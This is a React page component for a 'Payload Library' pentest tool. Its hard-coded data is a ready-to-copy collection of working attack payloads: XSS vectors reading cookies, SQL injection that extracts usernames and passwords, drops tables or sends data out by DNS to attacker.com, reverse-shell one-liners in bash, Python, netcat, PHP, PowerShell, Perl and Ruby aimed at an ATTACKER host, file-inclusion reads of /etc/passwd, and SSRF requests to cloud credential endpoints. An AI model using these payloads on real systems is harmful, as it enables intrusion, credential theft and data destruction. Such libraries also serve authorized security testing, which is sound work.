'use client'
import { useState } from 'react'

const PAYLOADS: Record<string, Array<{ label: string; payload: string; notes?: string }>> = {
  xss: [
    { label: 'Basic script tag',         payload: "<script>alert('XSS')</script>" },
    { label: 'IMG onerror',              payload: "<img src=x onerror=alert(1)>" },
    { label: 'SVG onload',               payload: "<svg onload=alert(document.cookie)>" },
    { label: 'Details ontoggle',         payload: "<details open ontoggle=alert(1)>" },
    { label: 'DOM-based (href)',          payload: "javascript:alert(document.domain)" },
    { label: 'Filter bypass (encoded)',   payload: "&#60;script&#62;alert(1)&#60;/script&#62;" },
    { label: 'CSP bypass via JSONP',      payload: "<script src=https://cdn.jsdelivr.net/callback=alert></script>", notes: 'Requires CSP allowing CDN' },
    { label: 'Data URI',                  payload: "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>" },
    { label: 'Template literal',          payload: '${alert(1)}' },
    { label: 'Angular ng-src',            payload: "{{constructor.constructor('alert(1)')()}}", notes: 'AngularJS 1.x SSTI' },
  ],
  sqli: [
    { label: 'Basic OR bypass',           payload: "' OR '1'='1" },
    { label: 'Comment bypass',            payload: "' OR 1=1--" },
    { label: 'UNION column count',        payload: "' ORDER BY 1--" },
    { label: 'UNION data extract',        payload: "' UNION SELECT null,username,password FROM users--" },
    { label: 'Time-based blind (MySQL)',   payload: "' AND SLEEP(5)--" },
    { label: 'Time-based blind (MSSQL)',   payload: "'; WAITFOR DELAY '0:0:5'--" },
    { label: 'Boolean blind',             payload: "' AND 1=1--" },
    { label: 'Error-based (MySQL)',        payload: "' AND extractvalue(1,concat(0x7e,database()))--" },
    { label: 'Stacked queries',            payload: "'; DROP TABLE users--", notes: 'MySQL only with stacked query support' },
    { label: 'Out-of-band (DNS)',          payload: "' UNION SELECT LOAD_FILE(concat('\\\\\\\\',database(),'.attacker.com\\\\'))--" },
  ],
  shells: [
    { label: 'Bash TCP',                  payload: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" },
    { label: 'Python3 TCP',               payload: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'" },
    { label: 'Netcat (with -e)',           payload: "nc -e /bin/sh ATTACKER 4444" },
    { label: 'Netcat (without -e)',        payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f" },
    { label: 'PHP one-liner',             payload: "php -r '$sock=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
    { label: 'PowerShell',                payload: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"ATTACKER\",4444)" },
    { label: 'Perl',                       payload: "perl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
    { label: 'Ruby',                       payload: "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"ATTACKER\",4444))'" },
  ],
  lfi: [
    { label: 'Basic traversal',           payload: "../../../../etc/passwd" },
    { label: 'Double encoding',           payload: "..%252f..%252f..%252fetc%252fpasswd" },
    { label: 'Null byte (PHP < 5.3)',      payload: "../../../../etc/passwd%00" },
    { label: 'Wrapper php://filter',       payload: "php://filter/convert.base64-encode/resource=index.php" },
    { label: 'Wrapper expect://',          payload: "expect://whoami" },
    { label: 'Log poisoning (access log)', payload: "/var/log/apache2/access.log", notes: 'After injecting PHP in User-Agent' },
    { label: 'Proc environ',              payload: "/proc/self/environ" },
    { label: 'SSRF to localhost',          payload: "http://127.0.0.1:80/" },
    { label: 'SSRF AWS metadata',          payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
    { label: 'SSRF IPv6',                  payload: "http://[::1]:80/" },
  ],
  ssrf: [
    { label: 'Localhost bypass',          payload: "http://localhost/admin" },
    { label: 'IPv6 localhost',            payload: "http://[::1]/admin" },
    { label: 'Decimal IP',               payload: "http://2130706433/" },
    { label: 'Octal IP',                  payload: "http://0177.0.0.1/" },
    { label: 'AWS IMDSv1',               payload: "http://169.254.169.254/latest/meta-data/" },
    { label: 'GCP metadata',             payload: "http://metadata.google.internal/computeMetadata/v1/" },
    { label: 'Azure metadata',           payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01" },
    { label: 'DNS rebinding prep',        payload: "http://attacker.com/", notes: 'Set attacker.com to resolve to 127.0.0.1 after first request' },
  ],
}

const TABS = [
  { id: 'xss',    label: 'XSS',           icon: '🌐' },
  { id: 'sqli',   label: 'SQL Injection',  icon: '💉' },
  { id: 'shells', label: 'Rev Shells',     icon: '🐚' },
  { id: 'lfi',    label: 'LFI / RFI',      icon: '📁' },
  { id: 'ssrf',   label: 'SSRF',           icon: '🔄' },
]

export default function PayloadsPage() {
  const [activeTab, setActiveTab]   = useState('xss')
  const [copied, setCopied]         = useState<string | null>(null)
  const [search, setSearch]         = useState('')
  const [attacker, setAttacker]     = useState('10.10.10.10')
  const [port, setPort]             = useState('4444')

  function copy(payload: string) {
    const final = payload.replace(/ATTACKER/g, attacker).replace(/4444/g, port)
    navigator.clipboard.writeText(final)
    setCopied(final)
    setTimeout(() => setCopied(null), 2000)
  }

  const payloads = PAYLOADS[activeTab] ?? []
  const filtered = search
    ? payloads.filter(p => p.label.toLowerCase().includes(search.toLowerCase()) || p.payload.toLowerCase().includes(search.toLowerCase()))
    : payloads

  return (
    <div className="p-5">
      <div className="mb-5">
        <h1 className="text-2xl font-black">Payload <span className="text-accent">Library</span></h1>
        <p className="font-mono text-[11px] text-slate-500 mt-1">
          Curated offensive payloads for authorized penetration testing
        </p>
      </div>

      {/* Tabs */}
      <div className="flex gap-2 mb-4 flex-wrap">
        {TABS.map(t => (
          <button key={t.id} onClick={() => { setActiveTab(t.id); setSearch('') }}
            className={`flex items-center gap-2 font-mono text-[11px] px-4 py-2 rounded-lg border transition-all
              ${activeTab === t.id
                ? 'border-accent/30 text-accent bg-accent/8'
                : 'border-white/[0.08] text-slate-500 hover:text-slate-300'}`}>
            <span>{t.icon}</span>{t.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-[1fr_260px] gap-4">
        <div className="space-y-3">
          {/* Search */}
          <div className="relative">
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-600">⌕</span>
            <input value={search} onChange={e => setSearch(e.target.value)}
              placeholder={`Search ${activeTab} payloads...`}
              className="w-full bg-white/[0.04] border border-white/[0.08] rounded-lg pl-8 pr-4 py-2.5
                         font-mono text-[12px] text-slate-300 outline-none placeholder-slate-700
                         focus:border-accent/30 transition-colors" />
          </div>

          {/* Payload list */}
          <div className="glass overflow-hidden">
            <div className="px-4 py-2.5 border-b border-white/[0.06]" style={{ background: 'rgba(0,255,170,0.03)' }}>
              <span className="font-mono text-[10px] text-accent tracking-widest uppercase">
                {activeTab.toUpperCase()} PAYLOADS — {filtered.length}
              </span>
            </div>
            <div className="divide-y divide-white/[0.03]">
              {filtered.map((p, i) => {
                const final = p.payload.replace(/ATTACKER/g, attacker).replace(/4444/g, port)
                const isCopied = copied === final
                return (
                  <div key={i} className="group px-4 py-3 hover:bg-white/[0.03] transition-colors">
                    <div className="flex items-start justify-between gap-3 mb-1.5">
                      <div className="font-mono text-[10px] font-bold text-slate-400">{p.label}</div>
                      <button onClick={() => copy(p.payload)}
                        className={`font-mono text-[9px] px-2 py-1 rounded border shrink-0 transition-all
                          ${isCopied
                            ? 'border-accent/35 text-accent bg-accent/8'
                            : 'border-white/[0.08] text-slate-600 hover:border-accent/25 hover:text-accent'}`}>
                        {isCopied ? '✓ COPIED' : '📋 COPY'}
                      </button>
                    </div>
                    <code className="block font-mono text-[11px] text-slate-300 leading-relaxed break-all"
                      style={{ background: 'rgba(0,0,0,0.3)', padding: '8px 10px', borderRadius: '6px' }}>
                      {final}
                    </code>
                    {p.notes && (
                      <div className="font-mono text-[9px] text-slate-600 mt-1.5">ℹ {p.notes}</div>
                    )}
                  </div>
                )
              })}
            </div>
          </div>
        </div>

        {/* Config sidebar */}
        <div className="space-y-4">
          {['shells', 'ssrf'].includes(activeTab) && (
            <div className="glass p-4">
              <div className="font-mono text-[9px] text-slate-600 uppercase tracking-widest mb-3">
                Shell Config
              </div>
              <div className="space-y-3">
                <div>
                  <label className="font-mono text-[9px] text-slate-600 block mb-1">ATTACKER IP</label>
                  <input value={attacker} onChange={e => setAttacker(e.target.value)}
                    className="w-full bg-white/[0.04] border border-white/[0.08] rounded-lg px-3 py-2
                               font-mono text-[12px] text-accent outline-none focus:border-accent/30 transition-colors" />
                </div>
                <div>
                  <label className="font-mono text-[9px] text-slate-600 block mb-1">PORT</label>
                  <input value={port} onChange={e => setPort(e.target.value)}
                    className="w-full bg-white/[0.04] border border-white/[0.08] rounded-lg px-3 py-2
                               font-mono text-[12px] text-accent outline-none focus:border-accent/30 transition-colors" />
                </div>
                <div className="font-mono text-[9px] text-slate-600 p-2.5 rounded-lg border border-accent/10 bg-accent/[0.03]">
                  Payloads auto-replace ATTACKER and port with your values on copy.
                </div>
              </div>
            </div>
          )}

          <div className="glass p-4">
            <div className="font-mono text-[9px] text-slate-600 uppercase tracking-widest mb-3">Resources</div>
            <div className="space-y-1.5">
              {[
                { label: 'PayloadsAllTheThings', href: 'https://github.com/swisskyrepo/PayloadsAllTheThings' },
                { label: 'HackTricks',           href: 'https://book.hacktricks.xyz' },
                { label: 'PortSwigger Web Sec',  href: 'https://portswigger.net/web-security' },
                { label: 'OWASP Cheat Sheets',   href: 'https://cheatsheetseries.owasp.org' },
              ].map(r => (
                <a key={r.label} href={r.href} target="_blank" rel="noreferrer"
                  className="block font-mono text-[10px] text-slate-500 hover:text-accent2 transition-colors py-1
                             border-b border-white/[0.03] truncate">
                  ↗ {r.label}
                </a>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
